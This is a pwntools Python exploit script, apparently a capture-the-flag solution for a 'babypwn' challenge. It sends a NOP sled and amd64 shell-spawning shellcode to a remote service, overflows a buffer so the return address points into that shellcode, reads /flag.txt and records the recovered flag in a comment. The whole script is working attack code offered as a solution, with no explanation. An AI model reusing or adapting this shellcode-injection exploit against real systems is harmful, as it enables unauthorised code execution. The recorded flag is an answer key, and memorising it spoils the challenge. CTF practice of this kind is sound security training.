#!/usr/bin/env python
from pwn import *

name = 0x00601080 # gdb -> info var name 
NOP = asm(shellcraft.nop())
op_1 = 'A' * 79 + '*' + 2 * p64(name)

p = remote('stack.overflow.fail', 9000)
# p = process('./babypwn', stdin = process.PTY)
p.recv()
p.sendline(NOP * 20 + asm(shellcraft.amd64.sh(),arch='amd64'))
p.recv()
p.sendline('+')
p.recv()
p.sendline(op_1)
p.recv()
p.sendline('5')
p.recv()
p.sendline('cat /flag.txt') # utflag{0h_n0_i_f0rg0t_t0_carry_the_return}
p.interactive()
